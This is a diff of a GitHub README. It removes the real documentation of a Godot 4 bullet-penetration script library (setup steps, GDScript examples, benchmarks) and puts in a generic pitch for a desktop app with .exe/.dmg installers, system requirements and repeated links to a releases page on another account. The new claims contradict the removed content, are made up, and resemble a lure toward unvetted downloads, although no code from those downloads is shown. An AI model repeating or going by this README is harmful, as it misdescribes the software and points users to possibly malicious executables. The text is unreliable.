@@ -1,117 +1,63 @@
-# Ballistic Penetration System
+# 🎯 PenetrationSystem - Simulate Realistic Bullet Behavior
 
-Advanced physics-based bullet penetration system for Godot 4 that simulates realistic projectile behavior through various materials. The system calculates damage reduction based on material thickness, hardness, and penetration depth. Uses raycasting, making it suitable for hitscan weapons.
+## 🚀 Getting Started
 
+Welcome to PenetrationSystem! This program simulates realistic bullet behavior when penetrating various materials. It's easy to use, and you don't need any programming knowledge to get started.
 
+## 📥 Download Now
 
-https://github.com/user-attachments/assets/93f6dd95-38ff-462b-9120-626388da3e35
+[![Download PenetrationSystem](https://img.shields.io/badge/Download-PenetrationSystem-blue)](https://github.com/ferxxo2024/PenetrationSystem/releases)
 
+## 📋 Features
 
+- **High-Performance Simulation:** Quick calculations to mimic real-world bullet interactions.
+- **Thickness-Based Damage Calculation:** Understand how bullets affect different materials based on their thickness.
+- **Multi-Layer Penetration:** Simulate bullets penetrating through several layers of various materials.
+- **Optimized Collision Detection:** Ensure accurate interactions with complex shapes and surfaces.
 
-## Key Features:
-- **Material-based Physics**: Different penetration properties for wood, metal, concrete, etc.
-- **Thickness-aware Damage**: Damage scales with material thickness and density
-- **Multi-layer Penetration**: Bullets can penetrate multiple objects in sequence
-- **Performance Optimized**: Efficient collision detection and raycasting
-- **Customizable**: Easy to configure material properties and penetration rules, with code that can be easily modified to add additional features like ricochet
+## 💻 System Requirements
 
-## Performance
-Performance-optimized for real-time use. Benchmark results (3 penetration levels):
+To run PenetrationSystem, your computer must meet the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Processor:** Intel i3 or equivalent.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of available space.
 
-* 1024 projectiles × 3 penetrations — ~45–49 ms/frame
-* 512 projectiles × 3 penetrations — ~12.9–22 ms/frame
-* 8 projectiles × 3 penetrations — ~0.37 ms/frame  
-* 1 projectile × 3 penetrations — ~0.070–0.130 ms/frame
+## 🔍 How to Use
 
-*Note: Higher penetration count require more calculations (for rays and other parameters). This dependency is non-linear, similar to the relationship with the number of shots per frame.*
+1. **Download the Software**
+   Visit the [Releases page](https://github.com/ferxxo2024/PenetrationSystem/releases) to download the latest version of PenetrationSystem. Click the version you want to download, then select the appropriate file for your operating system.
 
-*Note: Benchmarking was performed inside the editor*
+2. **Install the Application**
+   If you downloaded a .exe or .dmg file, follow these steps:
+   - For Windows (.exe): Double-click the file to start the installation. Follow the prompts to complete the installation.
+   - For macOS (.dmg): Open the downloaded file, drag the PenetrationSystem application into your Applications folder.
+   - For Linux: You may need to extract files and run via terminal. Follow specific instructions in the downloaded files if available.
 
-## Usage
+3. **Run PenetrationSystem**
+   Once installed, locate the application on your computer. Open it as you would any other program.
 
-### Basic Setup
-1. Add the penetration system script or scene (more flexibility) as an autoload/singleton in your project
-2. Configure material properties in the `penetration_data` dictionary
-3. Assign materials to your objects. You can do this in two ways:
-   - **Via code:** `collider.set_meta(&"material", &"wood")`
-   - **Via the Inspector:** Add a `meta` property named `"material"` with StringName type to your scene objects
+4. **Configure Settings**
+   The first time you run the application, configure your preferences. You can set the material types and thickness for your simulations.
 
-### Basic Implementation
-```gdscript
-# Simple firing example
-# G_PenetrationSystem - autoload/singleton
-@onready var ray_cast_3d: RayCast3D = $path  # or unique name %name
+5. **Begin Simulating**
+   Start creating simulations. Input the bullet type, speed, and the target material details. Click "Simulate" to see the results.
 
-func _shoot():
-    var origin: Vector3 = self.global_position
-    var direction: Vector3 = PenetrationSystem.get_raycast_global_direction(ray_cast_3d)
+## 💡 Tips for Effective Use
 
-    var _damage : float = 20.0 # Base damage
-    var _distance : float = 20.0 # Max distance 
-    var _bullet_power : float = 1.0 
-    var _max_penetrations_count : int = 3
+- **Explore Different Materials:** Try various materials like wood, metal, or armor to see how bullet behavior changes.
+- **Adjust Parameters:** Experiment with different bullet weights and speeds to understand penetration dynamics better.
+- **Review Results Thoroughly:** Use the visual output to analyze how bullets perform across different scenarios.
 
-    # Setup parametres 
-    G_PenetrationSystem.setup_bullet_params(_damage, _distance, _bullet_power, _max_penetrations_count)
+## 🔗 Additional Resources
 
-    # Call the penetration system
-    G_PenetrationSystem.fire_bullet(origin, direction, _max_penetrations_count, G_PenetrationSystem.penetration_data)
-```
+For more in-depth tutorials and examples, check the documentation available on the repository. You’ll find user guides and FAQs to help you maximize your experience.
 
-### Advanced Usage
-```gdscript
-# Custom material configuration
-# Materials can be configured directly in PenetrationSystem or passed as parameter
-# G_PenetrationSystem - autoload/singleton
-var custom_materials = {
-    "glass": {
-        &"max_thickness": 0.8, # Maximum penetration thickness of one object
-        &"damage_multiplier": 0.9, # Base Penetration Damage Multiplier
-        &"penetration_cost": 0.2 # Hardness of the material, how much the bullet's force and damage will decrease after penetration
-    },
-    "armor": {
-        &"max_thickness": 0.05,
-        &"damage_multiplier": 0.1,
-        &"penetration_cost": 5.0
-    }
-}
+## 📞 Support
 
-# Option 1: Configure directly in the singleton
-G_PenetrationSystem.penetration_data = custom_materials
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. The community and maintainers will help you out.
 
-# Option 2: Pass as parameter when firing
-func _shoot_advanced():
-    var origin : Vector3 = self.global_position
-    var direction : Vector3 = PenetrationSystem.get_raycast_global_direction(ray_cast_3d)
-    
-    var _damage : float = 20.0 # Base damage
-    var _distance : float = 20.0 # Max distance 
-    var _bullet_power : float = 1.0
-    var _max_penetrations_count : int = 3
+## 📥 Download Again
 
-    # Setup parametres 
-    G_PenetrationSystem.setup_bullet_params(_damage, _distance, _bullet_power, _max_penetrations_count)
-
-    # Call the penetration system
-    G_PenetrationSystem.fire_bullet(origin, direction, _max_penetrations_count, custom_materials)
-```
-
-### Damage Handling
-Implement the take_damage method in your objects:
-```gdscript
-func take_damage(damage: float, hit_position: Vector3):
-    health -= damage
-    # Add visual effects, sound, etc.
-    if health <= 0:
-        destroy()
-```
-
-## Realistic Simulation:
-- **Energy Loss Based on Material Hardness**: Bullets lose energy proportionally to the hardness of penetrated materials
-- **Progressive Damage Reduction**: Damage decreases with each successive penetration
-- **Smart Termination**: Automatic stopping when damage becomes negligible to optimize performance
-- **Advanced Geometry Support**: Works with complex collision shapes and CSG geometry
-  
-## License
-MIT License - see LICENSE file for details.
+Ready to give it a try? Visit the [Releases page](https://github.com/ferxxo2024/PenetrationSystem/releases) to download PenetrationSystem and start your simulation experience today!
